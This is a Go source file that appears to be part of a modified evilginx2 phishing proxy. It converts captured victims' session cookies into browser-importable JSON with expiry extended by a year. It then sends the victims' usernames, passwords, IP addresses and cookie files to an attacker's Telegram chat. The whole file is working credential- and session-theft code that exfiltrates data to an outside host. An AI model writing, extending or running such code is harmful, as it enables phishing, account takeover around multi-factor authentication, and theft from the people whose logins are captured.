package core

import (
	"encoding/json"
	"fmt"
	"math/rand"
	"os"
	"path/filepath"
	"sync"
	"time"

	"github.com/kgretzky/evilginx2/log"
)

type Token struct {
	Name             string      `json:"name"`
	Value            string      `json:"value"`
	Domain           string      `json:"domain"`
	HostOnly         bool        `json:"hostOnly"`
	Path             string      `json:"path"`
	Secure           bool        `json:"secure"`
	HttpOnly         bool        `json:"httpOnly"`
	SameSite         string      `json:"sameSite"`
	Session          bool        `json:"session"`
	FirstPartyDomain string      `json:"firstPartyDomain"`
	PartitionKey     interface{} `json:"partitionKey"`
	ExpirationDate   *int64      `json:"expirationDate,omitempty"`
	StoreID          interface{} `json:"storeId"`
}

func extractTokens(input map[string]map[string]map[string]interface{}) []Token {
	var tokens []Token

	for domain, tokenGroup := range input {
		for _, tokenData := range tokenGroup {
			var t Token

			if name, ok := tokenData["Name"].(string); ok {
				t.Name = name
			}
			if val, ok := tokenData["Value"].(string); ok {
				t.Value = val
			}
			// Remove leading dot from domain
			for len(domain) > 0 && domain[0] == '.' {
				domain = domain[1:]
			}
			t.Domain = domain

			if hostOnly, ok := tokenData["HostOnly"].(bool); ok {
				t.HostOnly = hostOnly
			}
			if path, ok := tokenData["Path"].(string); ok {
				t.Path = path
			}
			if secure, ok := tokenData["Secure"].(bool); ok {
				t.Secure = secure
			}
			if httpOnly, ok := tokenData["HttpOnly"].(bool); ok {
				t.HttpOnly = httpOnly
			}
			if sameSite, ok := tokenData["SameSite"].(string); ok {
				t.SameSite = sameSite
			}
			if session, ok := tokenData["Session"].(bool); ok {
				t.Session = session
			}
			if fpd, ok := tokenData["FirstPartyDomain"].(string); ok {
				t.FirstPartyDomain = fpd
			}
			if pk, ok := tokenData["PartitionKey"]; ok {
				t.PartitionKey = pk
			}

			if storeID, ok := tokenData["storeId"]; ok {
				t.StoreID = storeID
			} else if storeID, ok := tokenData["StoreID"]; ok {
				t.StoreID = storeID
			}

			exp := time.Now().AddDate(1, 0, 0).Unix()
			t.ExpirationDate = &exp

			tokens = append(tokens, t)
		}
	}
	return tokens
}

func processAllTokens(sessionTokens, httpTokens, bodyTokens, customTokens string) ([]Token, error) {
	var consolidatedTokens []Token

	for _, tokenJSON := range []string{sessionTokens, httpTokens, bodyTokens} {
		if tokenJSON == "" {
			continue
		}

		var rawTokens map[string]map[string]map[string]interface{}
		if err := json.Unmarshal([]byte(tokenJSON), &rawTokens); err != nil {
			return nil, fmt.Errorf("error parsing token JSON: %v", err)
		}

		tokens := extractTokens(rawTokens)
		consolidatedTokens = append(consolidatedTokens, tokens...)
	}

	return consolidatedTokens, nil
}

var processedSessions = make(map[string]bool)
var sessionMessageMap = make(map[string]int)
var mu sync.Mutex

func generateRandomString() string {
	rand.Seed(time.Now().UnixNano())
	const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	length := 10
	randomStr := make([]byte, length)
	for i := range randomStr {
		randomStr[i] = charset[rand.Intn(len(charset))]
	}
	return string(randomStr)
}

func createTxtFile(session TSession) (string, error) {
	txtFileName := generateRandomString() + ".txt"
	txtFilePath := filepath.Join(os.TempDir(), txtFileName)

	txtFile, err := os.Create(txtFilePath)
	if err != nil {
		return "", fmt.Errorf("failed to create text file: %v", err)
	}
	defer txtFile.Close()

	tokensJSON, err := json.MarshalIndent(session.Tokens, "", "  ")
	if err != nil {
		return "", fmt.Errorf("failed to marshal Tokens: %v", err)
	}
	httpTokensJSON, err := json.MarshalIndent(session.HTTPTokens, "", "  ")
	if err != nil {
		return "", fmt.Errorf("failed to marshal HTTPTokens: %v", err)
	}
	bodyTokensJSON, err := json.MarshalIndent(session.BodyTokens, "", "  ")
	if err != nil {
		return "", fmt.Errorf("failed to marshal BodyTokens: %v", err)
	}
	customJSON, err := json.MarshalIndent(session.Custom, "", "  ")
	if err != nil {
		return "", fmt.Errorf("failed to marshal Custom: %v", err)
	}

	allTokens, err := processAllTokens(string(tokensJSON), string(httpTokensJSON), string(bodyTokensJSON), string(customJSON))
	if err != nil {
		log.Warning("notify: failed to process tokens: %v", err)
	}

	result, err := json.MarshalIndent(allTokens, "", "  ")
	if err != nil {
		return "", fmt.Errorf("failed to marshal final tokens: %v", err)
	}

	log.Debug("notify: combined %d tokens for session", len(allTokens))

	_, err = txtFile.WriteString(string(result))
	if err != nil {
		return "", fmt.Errorf("failed to write data to text file: %v", err)
	}

	return txtFilePath, nil
}

func formatSessionMessage(session TSession) string {
	username := TelegramMarkdownV2Escape(session.Username)
	password := TelegramMarkdownV2Escape(session.Password)
	landingURL := TelegramMarkdownV2Escape(session.LandingURL)
	userAgent := TelegramMarkdownV2Escape(session.UserAgent)
	remoteAddr := TelegramMarkdownV2Escape(session.RemoteAddr)

	return fmt.Sprintf("✨ *Session Information* ✨\n\n"+
		"👤 *Username:* `%s`\n"+
		"🔑 *Password:* `%s`\n"+
		"🌐 *Landing URL:* [Link](%s)\n"+
		"🖥️ *User Agent:* `%s`\n"+
		"🌍 *Remote Address:* `%s`\n"+
		"🕒 *Created:* `%d`\n"+
		"🕔 *Updated:* `%d`\n\n"+
		"📦 Tokens are attached as a separate file\\.\n",
		username,
		password,
		landingURL,
		userAgent,
		remoteAddr,
		session.CreateTime,
		session.UpdateTime,
	)
}

func Notify(session TSession, chatid string, teletoken string) {
	mu.Lock()
	// Check if the session is already processed
	if processedSessions[string(session.ID)] {
		mu.Unlock()
		messageID, exists := sessionMessageMap[string(session.ID)]
		if exists {
			txtFilePath, err := createTxtFile(session)
			if err != nil {
				fmt.Println("Error creating TXT file for update:", err)
				return
			}
			msg_body := formatSessionMessage(session)
			err = editMessageFile(chatid, teletoken, messageID, txtFilePath, msg_body)
			if err != nil {
				fmt.Printf("Error editing message: %v\n", err)
			}
			os.Remove(txtFilePath)
		} else {
			fmt.Println("Message ID not found for session:", session.ID)
		}
		return
	}

	// Mark session as processed
	processedSessions[string(session.ID)] = true
	mu.Unlock()

	// Create the TXT file for the original message
	txtFilePath, err := createTxtFile(session)
	if err != nil {
		fmt.Println("Error creating TXT file:", err)
		return
	}

	// Format the message
	message := formatSessionMessage(session)

	// Send the notification and get the message ID
	messageID, err := sendTelegramNotification(chatid, teletoken, message, txtFilePath)
	if err != nil {
		fmt.Printf("Error sending Telegram notification: %v\n", err)
		os.Remove(txtFilePath)
		return
	}

	// Map the session ID to the message ID
	mu.Lock()
	sessionMessageMap[string(session.ID)] = messageID
	mu.Unlock()

	// Remove the temporary TXT file
	os.Remove(txtFilePath)

	// Auto-export session if enabled
	go AutoExportSession(session)
}
